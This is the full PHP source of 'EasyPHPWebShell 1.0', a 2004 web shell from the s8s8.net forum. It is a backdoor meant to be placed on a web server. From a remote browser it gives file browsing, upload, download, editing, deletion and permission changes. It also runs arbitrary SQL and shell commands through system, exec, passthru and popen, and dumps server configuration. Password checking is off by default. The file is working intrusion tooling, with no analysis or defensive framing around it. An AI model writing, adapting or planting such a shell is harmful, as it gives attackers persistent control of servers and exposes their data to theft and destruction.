
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8测试版)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, 宋体;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php
@set_time_limit(0);
@error_reporting(E_ERROR | E_WARNING | E_PARSE);
@ob_start();
$pagestarttime = microtime();

if (get_magic_quotes_gpc()) {
    $_GET = array_stripslashes($_GET);
    $_POST = array_stripslashes($_POST);
}

/////参数设置

$chkpassword = 0;//是否有密码验证

$my_password = "5065338";//设置密码,如果chkpassword为0,此处设置无效.

$cookit_time = 24;//设置cookie有效时间(单位:小时,注:一天24小时)

//////结束

?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8测试版)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, 宋体;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?

if($chkpassword == 1){
	@session_start();
	if ($_GET["action"] == "logout") {
		@session_unregister("smy_password");
		@session_destroy();
		@setcookie ("cmy_password","");
		echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
	}
	if($_GET["action"] == "login"){
		if($my_password==$_POST["pmy_password"]){
			@session_register("smy_password");
			$_SESSION["smy_password"] = $my_password;
			@setcookie ("cmy_password",$my_password,time()+(3600*$cookit_time));
			echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
		}
	}
	if (@session_is_registered("smy_password")||isset($_COOKIE["cmy_password"])){
		if (($_SESSION["smy_password"]!=$my_password)&&(!isset($_COOKIE["cmy_password"])||$_COOKIE["cmy_password"]!=$my_password))
			getloginpass();
	}else getloginpass();
}

if(!@get_cfg_var("register_globals")){
    foreach($_GET as $key => $val) $$key = $val;
    foreach($_POST as $key => $val) $$key = $val;
	foreach($_FILES as $key => $val) $$key = $val;
}

if(isset($df_path)){
    if (!file_exists($df_path)) $errordownload = "没找到文件"; 
    else {
        $df_name = basename($df_path);
        $df_fhd=fopen($df_path,"rb");
        if($df_fhd==false) $errordownload = "打开文件错误";
        else{
            Header("Content-type: application/octet-stream");
            Header("Accept-Ranges: bytes");
            Header("Accept-Length: ".filesize($df_path));
            Header("Content-Disposition: attachment; filename=".$df_name);
            echo fread($df_fhd,filesize($df_path));
            fclose($df_fhd);
            exit;
        }
    } 
}

if(isset($gotodir)) if($gotodir != "") $dir=$gotodir;

if(!isset($action)) {
    $action = "dir";
    $dir = ".";
}

if(!isset($dir)) $dir = ".";

$rootdir = str_replace("\\\\","/",$_SERVER["DOCUMENT_ROOT"]);

if(isset($abspath)) $dir = gettruepath($dir);
else if(isset($unabspath)){
    $dir = gettruepath($dir);
    if(strstr($dir,$rootdir)) $dir = str_replace("$rootdir",".",$dir);  
    else $dir=".";
}
$rny="<font color=green><b>■</b></font>";$rnn="<font color=red><b>■</b></font>";

?>

<SCRIPT LANGUAGE="JavaScript">
function rusuredel(msg,url){
    smsg = "确实要删除文件(目录)[" + msg + "]吗?";
    if (confirm(smsg)){
        url = url + msg;
        window.location = url;
    } 
}

function rusurechk(msg,url){
    smsg = "源文件(目录,属性)为[" + msg + "],请输入目标文件(目录,属性):";
    re = prompt(smsg,msg);
    if (re){
        url = url + re;
        window.location = url;
    }
}
</script>
</head>
<body>

<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" width="100%" bgcolor="#000000" class="stylebtext3">
            欢迎使用EasyPHPWebShell 1.0(S8S8测试版)【切莫用于任何非法途径否则后果自负】
        </td>
    </tr>
    <tr>
        <td align="center" bgcolor="#EEEEEE">
            本文件绝对路径:<? $stmp =str_replace("\\","/", __FILE__);echo "【<a href=\"$HTTP_SERVER_VARS[PHP_SELF]\">$stmp</a>】";?>【<a href="?action=logout">点此注销会话</a>】
        </td>
    </tr>
    <tr>
        <td align="center"  bgcolor="#EEEEEE">【<a href="?action=dir&dir=.">文件管理</a>】【<a href="?action=editfile&dir=<?=urlencode($dir);?>&editfile=<?=urlencode($dir);?>/">文本编辑器</a>】【<a href="?action=sql">数据库查询</a>】【<a href="?action=shell">Shell命令</a>】【<a href="?action=env">环境变量</a>】【<a href="?action=phpinfo">PHP系统信息</a>】【<a href="http://www.s8s8.net/forums/index.php?showtopic=15998">查看更新</a>】
        </td>
    </tr>
</table>
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td width="100%" bgcolor="#000000" align="center" class="stylebtext3">
<?if($action == "dir"){?>
	文件管理
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=dir&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;当前目录:&nbsp;
	<input name="gotodir" type="text" class="style1" value="<?=$dir?>" size="60">&nbsp;
	<input name="gotodirb" type="submit" class="style1" value="跳转"><?if($dir[1] == ':') echo "【<a href=\"?action=dir&dir=".urlencode($dir)."&unabspath=1\">点此用<b>相对</b>路径查看</a>】&nbsp;";else echo "【<a href=\"?action=dir&dir=".urlencode($dir)."&abspath=1\">点此用<b>绝对</b>路径查看</a>】&nbsp;";?>
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=fileup&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;文件上传到(目录):
	<input name="filedir" type="text" class="style1" value="<?=$dir?>" size="30">&nbsp;本地文件:
	<input name="userfile" type="file" class="style1" size="30">&nbsp;
	<input name="userfileb" type="submit" class="style1" value="上传">
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=filecreate&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;新建文件(目录)在当前目录:&nbsp; 
	<input name="mkname" type="text" value="" size=30 class="style1">&nbsp;
	<input name="mkfileb" type="submit" value="新建文件" class="style1">&nbsp;
	<input name="mkdirb" type="submit" value="新建目录" class="style1">&nbsp;当前目录状态:【<b><?$write = "不可写";if(is_dir($dir)) {if ($fp = @fopen("$dir/temp.tmp", 'w')) {@fclose($fp);@unlink("$dir/temp.tmp");$write = "可写";}}echo "$write</b>】";?>
	</td>
	</tr>
	</table>

	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr bgcolor="#000000" class="stylebtext3">
		<td width="25%">文件名</td>
		<td width="40%">建立时间|最后修改时间</td>
		<td width="10%">大小(KB)</td>
		<td width="8%">属性</td>
		<td width="17%">操作</td>
	</tr>
	<?php
	$filesum=0;$dirsum=0;$color="#EEEEEE";
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(@is_dir("$dir/$lop_fname")){
			$lop_fsize = "-";
			$lop_fcdata = "-";
			$lop_fmdata = "-";
			$lop_foper="-";
			$lop_ftype="-";
			if($lop_fname==".."){
				if($dir == ".") continue;
				$dirb=@dirname($dir);
				if($dir[1] ==':'){
					$dirb = gettruepath($dirb);
					if(strlen($dirb) <=3) $dirb = substr($dirb,0,2);
				}
				$bp="△ ";
				$lop_fname = "上级目录";
			}else if($lop_fname=="."){
				if($dir == ".") continue;
				$dir[1] ==':'?$dirb = substr(gettruepath($dirb),0,2):$dirb=$lop_fname;
				$bp="○ ";
				$lop_fname = "根级目录";
			}else{
				$lop_fsize = "[DIR]";
				$dirb="$dir/$lop_fname";    
				$lop_fcdata = @date("Y-n-d H:i:s",@filectime("$dirb"));
				$lop_fmdata = @date("Y-n-d H:i:s",@filemtime("$dirb"));
				$lop_ftype= substr(@base_convert(@fileperms($dirb),10,8),-4);
				$bp="□ ";
				$title = "点击进入文件夹[$lop_fname]";
				$lop_foper= "[<a href=\"删除\" title=\"删除整个文件夹\" onClick=\"rusuredel('$dirb','?action=filedel&dir=$dir&deldir=');return false;\">删</a>|".
							"<a href=\"重命名\" title=\"重命名\" onClick=\"rusurechk('$dirb','?action=filerename&dir=$dir&renamef=$dirb&renamet=');return false;\">重</a>|".
							"<a href=\"拷贝\" title=\"拷贝\" onClick=\"rusurechk('$dirb','?action=filecopy&dir=$dir&copydirf=$dirb&copydirt=');return false;\">拷</a>|".
							"<a href=\"属性\" title=\"修改属性\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&ctype=');return false;\">属</a>]";
				$dirsum++;
			}
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">$bp [<a href=\"?action=dir&dir=$dirb\" title = \"进入\">$lop_fname</a>]</td>".
							"<td width=\"40%\">[$lop_fcdata|$lop_fmdata]</td>".
							"<td width=\"10%\">$lop_fsize</td>".
							"<td width=\"8%\">$lop_ftype</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
		}
	}
	@closedir($dirs);
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(!@is_dir("$dir/$lop_fname")&&$lop_fname!=".."){
			$lop_ftype= substr(@base_convert(@fileperms("$dir/$lop_fname"),10,8),-4);
			$lop_foper= "[<a href=\"删除\" title=\"删除\" onClick=\"rusuredel('$dir/$lop_fname','?action=filedel&dir=$dir&delfile=');return false;\">删</a>|".
						"<a href=\"重命名\" title=\"重命名\"  onClick=\"rusurechk('$dir/$lop_fname','?action=filerename&dir=$dir&renamef=$dir/$lop_fname&renamet=');return false;\">重</a>|".
						"<a href=\"拷贝\" title=\"拷贝\" onClick=\"rusurechk('$dir/$lop_fname','?action=filecopy&dir=$dir&copyfilef=$dir/$lop_fname&copyfilet=');return false;\">拷</a>|".
						"<a href=\"属性\" title=\"修改属性\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&cfile=$dir/$lop_fname&ctype=');return false;\">属</a>|".
						"<a href=\"?action=dir&df_path=$dir/$lop_fname\" title=\"下载\">下</a>|".
						"<a href=\"?action=editfile&dir=$dir&editfile=$dir/$lop_fname\" title=\"编辑\">编</a>]";
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">■ <a href=\"$dir/$lop_fname\" title = \"新窗口中打开\" target=\"_blank\">$lop_fname</a></td>".
							"<td width=\"40%\">[".@date("Y-n-d H:i:s",@filectime("$dir/$lop_fname"))."|".@date("Y-n-d H:i:s",@filemtime("$dir/$lop_fname"))."]</td>".
							"<td width=\"10%\">".@number_format(@filesize("$dir/$lop_fname")/1024,3)."</td>".
							"<td width=\"8%\">".$lop_ftype."</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
			$filesum++;
		}
	}
	@closedir($dirs);
	?>										  
	<tr bgcolor="#000000" class="stylebtext3" align="center">
		<td width="25%" colspan="5">目录数:<?=$dirsum?>,文件数:<?=$filesum?></td>
	</tr>
	</table>      
<?}else if ($action == "editfile"){?>
	文本编辑器(若目标文件不存在将新建新文件)
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=filesave&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">当前编辑文件名:
			<input name="editfilename" type="text" class="style1" value="<?=$editfile?>" size="30">
			<input name="editbackfile" type="checkbox" value="1" class="style1">生成备份文件(原文件.bak)<br>
			<textarea name="editfiletext" cols="120" rows="25" class="style1"><?
				$fd = @fopen($editfile, "rb");
				$fd==false?$readfbuff = "读取文件错误(或尚未读取文件).":$readfbuff = @fread($fd, filesize($editfile));
				@fclose( $fd );
				$readfbuff = htmlspecialchars($readfbuff);
				echo "$readfbuff";
			?></textarea><p>
			<input name="editfileb" type="submit" value="提交" class="style1">&nbsp;&nbsp;
			<input name="editagainb" type="reset" value="重置" class="style1">
			<a href="?action=dir&dir=<?=urlencode($dir);?>">点此返回文件浏览页面</a>
			<p>
		</td>
	</form>
	</tr>
	</table>
<?}else if("sql" == substr($action,0,3)){?>
	数据库查询
	</td>
	</tr>
	
	<tr>
	<form method="post" action="?action=sql" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			数据库地址:<input name="sqlhost" type="text" class="style1" value="<?=isset($sqlhost)?$sqlhost:"localhost"?>" size="20">
			端口:<input name="sqlport" type="text" class="style1" value="<?=isset($sqlport)?$sqlport:"3306"?>" size="5">
			用户名:<input name="sqluser" type="text" class="style1" value="<?=isset($sqluser)?$sqluser:"root"?>" size="10">
			密码:<input name="sqlpasd" type="text" class="style1" value="<?=isset($sqlpasd)?$sqlpasd:""?>" size="10">
			数据库名:<input name="sqldb" type="text" class="style1" value="<?=isset($sqldb)?$sqldb:""?>" size="10"><br>
			<textarea name="sqlcmdtext" cols="120" rows="10" class="style1"><?
				if(!empty($sqlcmdtext)){
					@mysql_connect("{$sqlhost}:{$sqlport}","$sqluser","$sqlpasd") or die("数据库连接失败");
					@mysql_select_db("$sqldb") or die("选择数据库失败");
					$res = @mysql_query("$sqlcmdtext");
					echo $sqlcmdtext;
					mysql_close();
				}
			?></textarea><p>
			<span class="stylebtext2"><?echo isset($sqlcmdb)?($res?"执行成功.":"执行失败:".mysql_error()):"";?></span><p>
			<input name="sqlcmdb" type="submit" value="执行" class="style1">&nbsp;&nbsp;
			<input name="sqlagainb" type="reset" value="重置" class="style1">
			<p>
		</td>
	</form>
	</tr>
	</table>
<?}else if("shell" == substr($action,0,5)){?>
	Shell命令
	</td>
	</tr>

	<tr>
		<form method="post" action="?action=shell" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			函数:<select name="seletefunc" class="input">
				<option value="system" <?=($seletefunc=="system")?"selected":"";?>>system</option>
				<option value="exec" <?=($seletefunc=="exec")?"selected":"";?>>exec</option>
				<option value="shell_exec" <?=($seletefunc=="shell_exec")?"selected":"";?>>shell_exec</option>
				<option value="passthru" <?=($seletefunc=="passthru")?"selected":"";?>>passthru</option>
				<option value="popen" <?=($seletefunc=="popen")?"selected":"";?>>popen</option>
			</select>
			命令:<input name="shellcmd" type="text" class="style1" value="<?=isset($shellcmd)?$shellcmd:""?>" size="80">
			<textarea name="shelltext" cols="120" rows="10" class="style1"><?
				if(!empty($shellcmd)){
					if($seletefunc=="popen"){
						$pp = popen($shellcmd, 'r');
						echo fread($pp, 2096);
						pclose($pp);
					}else{
						echo $out =  ("system"==$seletefunc)?system($shellcmd):(($seletefunc=="exec")?exec($shellcmd):(($seletefunc=="shell_exec")?shell_exec($shellcmd):(($seletefunc=="passthru")?passthru($shellcmd):system($shellcmd))));	
					}
				}
			?></textarea><p>
			<span class="stylebtext2"><?echo get_cfg_var("safe_mode")?"提示:安全模式下可能无法执行":"";?></span><p>
			<input name="shellcmdb" type="submit" value="执行" class="style1">&nbsp;&nbsp;
			<input name="shellagainb" type="reset" value="重置" class="style1">
			<p>
	</td>
	</form>
	</tr>
	</table>
<?}else if($action=="phpinfo"){?>
	PHP系统信息
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2"><br><?phpinfo();
		if(eregi("phpinfo",get_cfg_var("disable_functions"))) echo "<b>phpinfo函数被禁止</b><br>";
	?><br>
	</td>
	</tr>
	</table>
<?}else if("file" == substr($action,0,4)){?>
	系统消息
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2">
	<br>
	<?
		if($action == "filesave"){
			if(isset($editfileb)&&isset($editfilename)){
				if(isset($editbackfile)&&($editbackfile == 1)) 
					echo $out = @copy($editfilename,$editfilename.".bak")?"生成备份文件成功.<p>":"生成备份文件成功<p>";
				$fd = @fopen($editfilename, "w");
				if($fd == false) echo "打开文件[$editfilename]错误.";
				else{
					echo $out=@fwrite($fd,$editfiletext)?"编辑文件[$editfilename]成功!":"写入文件文件[$editfilename]错误";
					@fclose( $fd );
				}
			}
		}else if($action == "filedel"){
			if(isset($deldir)) {
				echo $out = file_exists($deldir)?(deltree($deldir)?"删除目录[$deldir]成功!":"删除目录[$deldir]失败!"):"目录[$deldir]不存在!!";
			}else if(isset($delfile)){
				@chmod("$delfile", 0777);
				echo $out = file_exists($delfile)?(@unlink($delfile)?"删除文件[$delfile]成功!":"删除文件[$delfile]失败!"):"文件[$delfile]不存在!";
			}
		}else if($action == "filerename"){
			echo $out = file_exists($renamef)?(@rename($renamef,$renamet)?"重命名[$renamef]为[{$renamet}]成功":"重命名[$renamef]为[{$renamet}]失败"):"文件[$renamef]不存在!";
		}else if($action =="filecopy") {
			if(isset($copydirf)&&isset($copydirt)){
				echo $out = file_exists($copydirf)?(truepath($copydirt)?(copydir($copydirf,$copydirt)?"拷贝目录[$copydirf]到[$copydirt]成功":"拷贝目录[$copydirf]到[$copydirt]失败"):"目标目录[$copydirt]不存在且创建错误"):"目录[$copydirf]不存在!";
			}else if(isset($copyfilef)&&isset($copyfilet)){
				echo $out = file_exists($copyfilef)?(truepath(dirname($copyfilet))?(@copy($copyfilef,$copyfilet)?"拷贝文件[$copyfilef]到[$copyfilet]成功":"拷贝文件[$copyfilef]到[$copyfilet]失败"):"目标目录不存在且创建错误"):"源文件[$copyfilef]不存在!";
			}
		}else if($action == "filecreate"){
			if(isset($mkdirb)){
				echo $out = file_exists("$dir/$mkname")?"[{$dir}/{$mkname}]该目录已存在":(@mkdir("$dir/$mkname",0777)?"目录[$mkname]创建成功":"目录[$mkname]创建失败");
			}else if(isset($mkfileb)){
				if(file_exists("$dir/$mkname")) echo "[$dir/$mkname]该文件已存在";
				else{
					$fd = @fopen("$dir/$mkname", "w");
					if($fd == false) echo "建立文件[$mkname]错误.";
					else{
						echo "建立文件[$mkname]成功 <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($dir)."/".urlencode($mkname)."\"><p>点此跳转入编辑浏览页面</a>";
						@fclose( $fd );
					}
				}
			}
		}else if($action == "filetype"){
			echo $out=@chmod($cfile,base_convert($ctype,8,10))?"更改成功!":"更改失败!";
		}else if($action == "fileup"){
			echo  $out = @copy($userfile["tmp_name"],"{$filedir}/{$userfile['name']}")?"上传文件[{$userfile['name']}]成功.位置:[{$filedir}/{$userfile['name']}]共({$userfile['size']})字节.":"上传文件[{$userfile['name']}]失败";
		}else{
			echo "错误的提交参数action.";
		}
	?>
	<p>
	<a href="?action=dir&dir=<?=urlencode($dir);?>">点此返回文件浏览页面</a>
	<p>
	</td>
	</tr>
	</table>

<?}else if($action=="env"){?>
	环境变量&nbsp;&nbsp;<?=$rny?>支持&nbsp;&nbsp;<?=$rnn?>不支持<br>
	</td>
	</tr>
	<?
	$sinfo[0] = array("主机域名:",$_SERVER["SERVER_NAME"]);
	$sinfo[1] = array("主机IP:",gethostbyname($_SERVER["SERVER_NAME"]));
	$sinfo[2] = array("主机端口:",$_SERVER["SERVER_PORT"]);
	$sinfo[3] = array("主机时间:",date("Y/m/d_h:i:s",time()));
	$sinfo[4] = array("主机系统:",PHP_OS);
	$sinfo[5] = array("主机WEB服务器",$_SERVER["SERVER_SOFTWARE"]);
	$sinfo[6] = array("PHP版本:",PHP_VERSION);
	$sinfo[7] = array("剩余空间:",intval(diskfreespace(".") / (1024 * 1024).'MB'));
	$sinfo[8] = array("主机语言",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$sinfo[9] = array("当前用户",get_current_user());
	$sinfo[10] = array("最大内存占用:",my_func("memory_limit",1));
	$sinfo[11] = array("最大单个上传文件",my_func("upload_max_filesize",1));
	$sinfo[12] = array("POST最大容量",my_func("post_max_size",1));
	$sinfo[13] = array("脚本超时",my_func("max_execution_time",1));
	$sinfo[14] = array("屏蔽的函数",my_func("disable_functions",1));

	$ssql[0] = array("MYSQL",my_func("mysql_close",2)); 
	$ssql[1] = array("Oracle",my_func("ora_close",2)); 
	$ssql[2] = array("Oracle 8",my_func("OCILogOff",2)); 
	$ssql[3] = array("OBDC",my_func("odbc_close",2)); 
	$ssql[4] = array("SyBase",my_func("sybase_close",2)); 
	$ssql[5] = array("SQL_Server",my_func("mssql_close",2)); 
	$ssql[6] = array("DBase",my_func("dbase_close",2)); 
	$ssql[7] = array("Hyperwave",my_func("hw_close",2));
	$ssql[8] = array("Postgre_SQL",my_func("pg_close",2));

	$sobj[0] = array("Session支持",my_func("session_start",2));
	$sobj[1] = array("Socket支持",my_func("fsockopen",2));
	$sobj[2] = array("压缩文件支持(Zlib)",my_func("gzclose",2));
	$sobj[3] = array("SMTP支持",my_func("smtp",2));
	$sobj[4] = array("XML支持",my_func("XML Support",3));
	$sobj[5] = array("FTP支持",my_func("FTP support",3));
	$sobj[6] = array("Sendmail支持",my_func("Internal Sendmail Support for Windows 4",3));
	$sobj[7] = array("SNMP支持",my_func("snmpget",2));
	$sobj[8] = array("PDF文档支持",my_func("pdf_close",2));
	$sobj[9] = array("IMAP电子邮件支持",my_func("imap_close",2));
	$sobj[10] = array("图形处理GD Library支持",my_func("imageline",2));
	$sobj[11] = array("ZEND支持",my_func("zend_version",2)."(".zend_version().")");

	$sobj[12] = array("允许使用URL打开文件",my_func("allow_url_fopen",2));
	$sobj[13] = array("PREL相容语法 PCRE",my_func("preg_match",2));
	$sobj[14] = array("显示错误信息",my_func("display_errors",2));
	$sobj[15] = array("自动定义全局变量",my_func("register_globals",2));
	$sobj[16] = array("PHP运行方式",strtoupper(php_sapi_name()));
	?>

	<tr>
	<td align="center" bgcolor="#EEEEEE">
		<table width="600" border="0" cellpadding="0" cellspacing="0"><br>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">主机信息</td></tr>
			<?
			for($i=0;$i<15;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sinfo[$i][0]}</td><td>{$sinfo[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">数据库支持信息</td></tr>
			<?
			for($i=0;$i<9;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$ssql[$i][0]}</td><td>{$ssql[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">组件和其他信息</td></tr>
			<?
			for($i=0;$i<17;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sobj[$i][0]}</td><td>{$sobj[$i][1]}</td></tr>";
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">自定义查看PHP配置参数(多个参数可用","逗号隔开)</td></tr>
			<tr bgcolor="#EEEEEE">
			<form method="post" action="?action=env" enctype="multipart/form-data">
				<td colspan="2">请输入参数的ProgId或ClassId:
					<input name="envname" type="text" size="50" class="style1" value=<?=isset($envname)?$envname:"";?>> 
					<input name="envnameb" type="submit" value="查看" class="style1">
				</td>
			</form>
			</tr>
			<?
				if(isset($envname)&&!empty($envname)){
					$envname=explode(",", $envname);
					$i=0;
					while($envname[$i]){
						echo "<tr bgcolor=\"#CCCCCC\"><td colspan=\"2\">查询[{$envname[$i]}]如下:</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_cfg_var方式</td><td>". my_func($envname[$i],1)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>function_exists方式</td><td>". my_func($envname[$i],2)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_gpc方式</td><td>". my_func($envname[$i],3)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_runtime方式</td><td>". my_func($envname[$i],4)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Getenv方式</td><td>". my_func($envname[$i],5)."</td></tr>";	
						$i++;
					}
				}
			?>
		</table><br>
	</td>
	</tr>
	</table>
<?}else{
	echo "错误的提交参数</td></tr><tr><td align=\"center\" bgcolor=\"#EEEEEE\"><br><a href=\"?action=dir&dir=".urlencode($dir)."\">点此返回文件浏览页面</a><p></td></tr></table>";
}echoend();@ob_end_flush();?>

<?

function array_stripslashes(&$array) {
    while(list($key,$var) = each($array)) {
        if ((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
            if (is_string($var)) $array[$key] = stripslashes($var);
            if (is_array($var)) $array[$key] = array_stripslashes($var);  
        }
    }
    return $array;
}

function deltree($TagDir){ 
	$mydir=@opendir($TagDir); 
	while($file=@readdir($mydir)){ 
		if((is_dir("$TagDir/$file")) && ($file!=".") && ($file!="..")) { 
			if(!deltree("$TagDir/$file")) return false;
		}else if(!is_dir("$TagDir/$file")){
			@chmod("$TagDir/$file", 0777);
			if(!@unlink("$TagDir/$file")) return false;
		}
	} 
	@closedir($mydir); 
	@chmod("$TagDir", 0777);
	if(!@rmdir($TagDir)) return false;
	return true;
}

function copydir($dirf,$dirt){
    $mydir=@opendir($dirf);
    while($file=@readdir($mydir)){
        if((is_dir("$dirf/$file")) && ($file!=".") && ($file!="..")) {
            if(!file_exists("$dirt/$file")) if(!@mkdir("$dirt/$file")) return false;
            if(!copydir("$dirf/$file","$dirt/$file")) return false;
        }else if(!is_dir("$dirf/$file")) if(!@copy("$dirf/$file","$dirt/$file")) return false;
    }
    return true;
}

function truepath($path){
	if(file_exists($path)) return true;	
	else{
		if(truepath(@dirname($path))){
			if(@mkdir($path)) return true;
			else return false;
		}else return false;
	}
}

function getpageruntime(){
    global $pagestarttime;
    $pagestarttime = explode(' ', $pagestarttime);
    $pageendtime = explode(' ',@microtime());
    return ($pageendtime[0]-$pagestarttime[0]+$pageendtime[1]-$pagestarttime[1]);
}

function echoend(){
    echo "<br><center>页面执行时间:".getpageruntime()." 秒<br>".
    "<span class = \"stylebtext2\">EasyPHPWebShell 1.0(S8S8测试版)</span><br>脚本由 <b>网络技术论坛(<a href=\"http://www.s8s8.net\">http://www.s8s8.net</a>) ZV(<a href=\"mailto:zvrop@163.com\">zvrop@163.com</a>)</b> 编写<br>".
    "Copyright (C) 2004 www.s8s8.net All Rights Reserved.</center>";
}

function gettruepath($path){
    return str_replace("\\","/",@realpath($path));
}

function my_func($getname,$tp){
	global $rny, $rnn;
	$out = ($tp==1)?@get_cfg_var($getname):(($tp==2)?@function_exists($getname):(($tp==3)?@get_magic_quotes_gpc($getname):(($tp==4)?@get_magic_quotes_runtime($getname):(($tp==5)?@Getenv($getname):"error!"))));
	return ($out == 1)?$rny:(($out == 0)?$rnn:$out);
}

function ch_color($c){
	return $c=="#CCCCCC"?"#EEEEEE":"#CCCCCC";
}

function getloginpass(){
	?>
	<br><br><br><br><br><br><br>
	<table align="center" width="300" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" bgcolor="#000000" class="stylebtext3">
            欢迎使用,请输入密码
        </td>
    </tr>
	<tr>
		<form method="post" action="?action=login" enctype="multipart/form-data">
        <td align="center" class="style1"><br>密码
        <input name="pmy_password" type="password" size="30" class="style1"><p>
		<input name="pmy_passwordb" type="submit" value="  登陆  " class="style1"><p>
        </td>
    </tr>
	</table>
	<?
	exit;
}
?>
